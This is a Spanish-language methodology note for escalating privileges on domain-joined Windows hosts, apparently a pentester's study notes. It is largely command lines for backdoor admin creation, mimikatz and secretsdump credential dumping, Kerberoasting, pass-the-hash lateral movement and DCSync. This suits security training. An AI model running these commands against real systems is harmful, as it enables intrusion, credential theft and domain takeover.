# Metodología — Windows Privilege Escalation (Miembro de Dominio)

Tags: #PrivEsc #Windows #AD #Dominio #Metodologia #Escalada #SYSTEM #Domain

## OBJETIVO

Mapa completo para escalar privilegios en máquinas Windows unidas a un dominio. Cubre dos caminos según el usuario con el que entras:

- **Camino A** → entras como usuario local o de servicio (iis, www-data, etc.)
- **Camino B** → entras como usuario de dominio directamente

---

## PASO 0 — IDENTIFICAR EN QUÉ CAMINO ESTÁS

```bash
❯ whoami
```

```
HOSTNAME\usuario     → usuario LOCAL  → Camino A
iis apppool\...      → usuario LOCAL de servicio → Camino A
NT AUTHORITY\...     → usuario LOCAL del sistema → Camino A
DOMAIN\usuario       → usuario de DOMINIO → Camino B
```

```bash
❯ whoami /priv
# SeImpersonatePrivilege habilitado → casi siempre en usuarios de servicio IIS/SQL
# → Potato attack → SYSTEM → sigue el Camino A desde Fase 2

❯ systeminfo | findstr /B /C:"Domain"
# Confirmar el nombre del dominio al que pertenece la máquina

❯ echo %LOGONSERVER%
# DC que autentica a los usuarios → identificar IP del DC
```

---

# CAMINO A — ENTRAS COMO USUARIO LOCAL O DE SERVICIO

## OBJETIVO DEL CAMINO A

```
Usuario local / servicio
    → Escalar a SYSTEM (igual que standalone)
    → Desde SYSTEM → extraer credenciales de dominio
    → Con credenciales de dominio → pasar al Camino B
```


---

## A.FASE 1 — ESCALAR A SYSTEM (IGUAL QUE STANDALONE)

```
Ejecutar winPEAS + PowerUp → buscar vectores locales
Seguir el mismo orden de prioridad que la nota standalone:

 1. SeImpersonatePrivilege → Potato attack → SYSTEM directo (más común en IIS/SQL)
 2. Weak Service Permissions → modificar servicio → SYSTEM
 3. Unquoted Service Path → plantar binario → SYSTEM
 4. AlwaysInstallElevated → MSI malicioso → SYSTEM
 5. DLL Hijacking → plantar DLL → SYSTEM
 6. Credenciales locales → reutilizar como admin local → secretsdump

→ Ver nota: 0 Win PrivEsc Standalone.md
→ Ver nota: 1 PowerUp.md
→ Ver nota: 2 WinPEAS.md
→ Ver nota: 3 Token-Priv, Groups.md   (PottatoAttacks)
```

### Insight clave

```
IIS (iis apppool\...) → casi siempre tiene SeImpersonatePrivilege
MSSQL (NT Service\MSSQL...) → casi siempre tiene SeImpersonatePrivilege
→ Verificar con whoami /priv → si está → Potato → SYSTEM garantizado
```

---

## A.FASE 2 — DESDE SYSTEM: CREAR USUARIO ADMIN LOCAL

```bash
# Una vez que tienes SYSTEM → crear usuario administrador local
❯ net user omar P4ssw0rd /add
❯ net localgroup administrators omar /add

# Verificar que se creó correctamente
❯ net user omar
❯ net localgroup administrators
```

```bash
# Desde Kali → conectarte con tu nuevo usuario
❯ evil-winrm -i <IP❯ -u omar -p P4ssw0rd
❯ xfreerdp /u:omar /p:P4ssw0rd /v:<IP❯
# Ahora tienes una sesión cómoda e interactiva como admin local
```

---

## A.FASE 3 — DESDE ADMIN LOCAL: BUSCAR CREDENCIALES DE DOMINIO

### 3.1 Ver si hay usuarios de dominio logueados

```bash
❯ query user
# Si hay un usuario de dominio logueado → alto valor → ir a 3.3 (mimikatz)
# Si es un Domain Admin logueado → JACKPOT → credenciales → DA directo
```

### 3.2 Dump de hashes SAM y LSA Secrets (desde Kali)

```bash
❯ impacket-secretsdump domain.corp/omar:P4ssw0rd@<IP❯
# No necesitas subir nada → lo hace desde Kali remotamente
# Extrae:
#   SAM → hashes de usuarios locales
#   LSA Secrets → credenciales de servicios de dominio
#   Cached credentials → hashes de usuarios de dominio que se loguearon antes
#   DPAPI masterkeys → puede contener más credenciales
```

### 3.3 Mimikatz — credenciales en memoria

```bash
# Subir mimikatz a la víctima → buscar credenciales de sesiones activas
❯ .\mimikatz.exe

❯ privilege::debug
# Habilitar privilegios de debug → necesario para acceder a lsass

❯ sekurlsa::logonpasswords
# Credenciales en claro y hashes de usuarios con sesión activa
# Si hay DA logueado → sus credenciales aparecen aquí

❯ lsadump::sam
# Hashes locales SAM

❯ lsadump::secrets
# LSA Secrets → credenciales de servicios que corren en el sistema
# Puede contener cuentas de servicio de dominio con sus contraseñas

→ Ver nota: Mimikatz.md
```

### 3.4 Password Hunting local

```bash
# Buscar credenciales en archivos del sistema
❯ cmdkey /list                    # Credential Manager
❯ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Autologon → puede tener contraseña de usuario de dominio en claro

❯ type C:\unattend.xml            # Instalación desatendida
❯ type C:\Windows\Panther\Unattend.xml

❯ findstr /si "password" C:\*.xml C:\*.txt C:\*.ini C:\*.config
# Buscar en archivos de configuración

→ Ver nota: Password_Hunting_Windows.md
```

### 3.5 Hash de la cuenta de máquina (HOSTNAME$)

```bash
# Con secretsdump → también obtienes el hash de HOSTNAME$
# HOSTNAME$ es la cuenta de dominio de la máquina
# Puedes usarla para autenticarte en el dominio como la máquina

❯ impacket-secretsdump domain.corp/omar:P4ssw0rd@<IP❯
# Buscar en el output: HOSTNAME$:...
# Ese hash → úsalo para SharpHound o consultas LDAP básicas
```

---

## A.FASE 4 — CON CREDENCIALES DE DOMINIO → PASAR A CAMINO B

```
¿Encontraste credenciales de dominio?
  Contraseña en claro de usuario de dominio  → Camino B con ese usuario
  Hash NT de usuario de dominio              → Pass-the-Hash → Camino B
  Hash de cuenta de servicio crackeado       → Camino B con ese usuario
  Solo hash de máquina HOSTNAME$             → Camino B limitado pero útil

→ Continuar en CAMINO B con las credenciales encontradas
```

---

# CAMINO B — ENTRAS O LLEGAS COMO USUARIO DE DOMINIO

## OBJETIVO DEL CAMINO B

```
Usuario de dominio (cualquier nivel)
    → Enumerar el dominio con BloodHound
    → Identificar paths hacia Domain Admin
    → Explotar ACLs, Kerberoasting, lateral movement
    → Comprometer el DC
```

---

## B.FASE 0 — ENUMERACIÓN DE USUARIOS DEL DOMINIO

Antes de BloodHound → recopilar usuarios por todos los vectores disponibles
→ Ver nota: 2.1 Users Win y AD.md

Vectores clave en dominio:
  - RPC null session → enumdomusers → lista completa sin creds
  - Kerbrute → validar wordlist contra DC
  - LDAP anonymous bind → si está habilitado
  - Responder/LLMNR → captura pasiva → usuarios reales
  - nxc smb --users → con creds → lista completa
  - Descripciones de usuarios → pueden contener contraseñas

---

## B.FASE 1 — ENUMERACIÓN DEL DOMINIO (BloodHound)

```bash
# Recolectar datos del dominio con SharpHound desde la máquina comprometida
❯ .\SharpHound.exe -c All
# Genera archivos .zip → transferir a Kali → importar en BloodHound

# Desde Kali si tienes creds (sin subir nada a la víctima)
❯ bloodhound-python -u user -p pass -d domain.corp -dc <IP_DC❯ -c All
# Genera archivos JSON → importar en BloodHound

# En BloodHound → análisis esencial:
#   1. Marcar tu usuario como "Owned"
#   2. Shortest Path to Domain Admins → camino más corto
#   3. Find Principals with DCSync Rights → quién puede hacer DCSync
#   4. Kerberoastable Users → cuentas con SPNs
#   5. AS-REP Roastable Users → sin preautenticación
#   6. Buscar edges desde tu usuario → ACLs abusables

→ Ver nota: BloodHound.md
```

---

## B.FASE 2 — VERIFICAR GRUPOS PRIVILEGIADOS

```bash
❯ whoami /groups
❯ net user %USERNAME% /domain
❯ net group /domain

# Grupos de alto valor → si perteneces a alguno → explotar directamente:
Domain Admins          → acceso total → DA directo
Backup Operators       → leer SAM/NTDS → dump hashes DC
Account Operators      → crear/modificar cuentas de dominio
Server Operators       → modificar servicios en DCs
DNSAdmins              → cargar DLL maliciosa en DNS del DC → SYSTEM en DC
Remote Desktop Users   → RDP a ciertos hosts
Remote Management Users → WinRM a ciertos hosts

→ Ver nota: AD_Grupos_Privilegiados.md
```

---

## B.FASE 3 — KERBEROASTING Y AS-REP ROASTING

```bash
# Kerberoasting → con cualquier usuario de dominio → cuentas con SPNs
❯ impacket-GetUserSPNs domain.corp/user:pass -dc-ip <IP_DC❯ -request -outputfile kerb.txt
❯ hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting → sin credenciales → cuentas sin preautenticación
❯ impacket-GetNPUsers domain.corp/ -no-pass -usersfile users.txt -dc-ip <IP_DC❯ -outputfile asrep.txt
❯ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Hash crackeado → credenciales de cuenta de servicio o usuario
# → probar en otros hosts → nxc smb subred → ver acceso
# → puede tener privilegios altos → BloodHound para ver qué alcanza

→ Ver nota: 88_Kerberos.md
→ Ver nota: Password_Cracking.md
```

---

## B.FASE 4 — ACL ABUSE

```bash
# BloodHound → buscar edges desde tu usuario hacia objetos de valor

# Edges más comunes y su abuso:
GenericAll sobre usuario       → cambiar su contraseña → acceder como ese usuario
GenericAll sobre grupo         → añadirte al grupo
ForceChangePassword            → cambiar contraseña sin conocerla → ver nota 464
GenericWrite sobre usuario     → modificar atributos → SPN → Kerberoast targeted
WriteDACL sobre dominio        → darte permisos DCSync
AllExtendedRights              → cambiar contraseña o leer atributos sensibles
AddMember sobre grupo          → añadir tu usuario al grupo

# En BloodHound → click en el edge → Help → Abuse Info → pasos exactos

→ Ver nota: ACL_Abuse_AD.md
→ Ver nota: 464_kpasswd.md
```

---

## B.FASE 5 — LATERAL MOVEMENT

```bash
# Con credenciales en claro
❯ evil-winrm -i <IP❯ -u user -p pass
❯ impacket-psexec domain.corp/user:pass@<IP❯
❯ impacket-wmiexec domain.corp/user:pass@<IP❯
❯ xfreerdp /u:user /p:pass /v:<IP❯

# Con hash NT (Pass-the-Hash)
❯ nxc smb <IP❯ -u user -H NThash
❯ evil-winrm -i <IP❯ -u user -H NThash
❯ impacket-psexec domain.corp/user@<IP❯ -hashes :NThash

# Descubrir a qué hosts tienes acceso con tus credenciales
❯ nxc smb <subred❯/24 -u user -p pass
❯ nxc smb <subred❯/24 -u user -H NThash
# Ver: Pwn3d! → tienes acceso admin a ese host

# Prioridad de targets
#   DC → si lo comprometes → dominas el dominio
#   Hosts de admins de dominio → si están logueados → mimikatz → DA creds

→ Ver nota: Lateral_Movement.md
```

---

## B.FASE 6 — DCSYNC (COMPROMETER EL DOMINIO)

```bash
# Condición: tener permisos DS-Replication sobre el dominio
# → Domain Admins y Enterprise Admins los tienen por defecto
# → WriteDACL sobre el dominio → darte permisos → DCSync

# Desde Kali → dump de TODOS los hashes del dominio
❯ impacket-secretsdump domain.corp/user:pass@<IP_DC❯
❯ impacket-secretsdump domain.corp/user@<IP_DC❯ -hashes :NThash

# Desde mimikatz en la máquina
❯ lsadump::dcsync /domain:domain.corp /user:Administrator
❯ lsadump::dcsync /domain:domain.corp /all

# Hash de Administrator → Pass-the-Hash → acceso a cualquier máquina
# Hash de krbtgt → Golden Ticket → persistencia indefinida

→ Ver nota: DCSync.md
```

---

## FLUJO DE DECISIÓN COMPLETO

```
Entro a máquina unida a dominio
│
├── whoami → ¿LOCAL o DOMINIO?
│
│
├── [CAMINO A] → Usuario LOCAL o de servicio
│     │
│     ├── whoami /priv → SeImpersonatePrivilege?
│     │     └── SÍ → Potato → SYSTEM → Fase A.2
│     │
│     ├── winPEAS + PowerUp → vectores locales
│     │     └── SYSTEM obtenido → Fase A.2
│     │
│     ├── [A.2] Crear usuario admin local
│     │     └── evil-winrm con ese usuario → Fase A.3
│     │
│     ├── [A.3] Buscar credenciales de dominio
│     │     ├── query user → DA logueado → mimikatz → credenciales
│     │     ├── secretsdump → SAM + LSA Secrets + cached creds
│     │     └── password hunting → autologon, archivos, registry
│     │
│     └── ¿Credenciales de dominio encontradas?
│           └── SÍ → CAMINO B con esas credenciales
│
│
└── [CAMINO B] → Usuario de DOMINIO
      │
      ├── SharpHound → BloodHound → paths hacia DA
      │
      ├── whoami /groups → grupos privilegiados → explotar
      │
      ├── Kerberoasting → hashes de cuentas de servicio → crackear
      │
      ├── AS-REP Roasting → cuentas sin preauth → crackear
      │
      ├── BloodHound → ACLs abusables → GenericAll, WriteDACL, etc.
      │
      ├── Lateral Movement → nxc smb subred → Pwn3d! → moverse
      │
      └── DCSync → hashes de todo el dominio → dominio comprometido
```

---

## REFERENCIAS A NOTAS ESPECÍFICAS

```
0_Metodologia_Windows_PrivEsc_Standalone.md → Vectores locales completos
WinPEAS.md                                  → Enumeración automatizada local
PowerUp.md                                  → Enumeración específica PrivEsc
Potato_Attacks.md                           → JuicyPotato, PrintSpoofer, GodPotato
Mimikatz.md                                 → Dump de credenciales en memoria
Password_Hunting_Windows.md                 → Búsqueda de credenciales locales
BloodHound.md                               → Enumeración y análisis AD
88_Kerberos.md                              → Kerberoasting, AS-REP, tickets
ACL_Abuse_AD.md                             → Abuso de permisos AD
AD_Grupos_Privilegiados.md                  → Grupos especiales de dominio
Lateral_Movement.md                         → Movimiento lateral
DCSync.md                                   → Dump de hashes del dominio
464_kpasswd.md                              → Cambio de contraseñas AD
Password_Cracking.md                        → Crackeo de hashes
```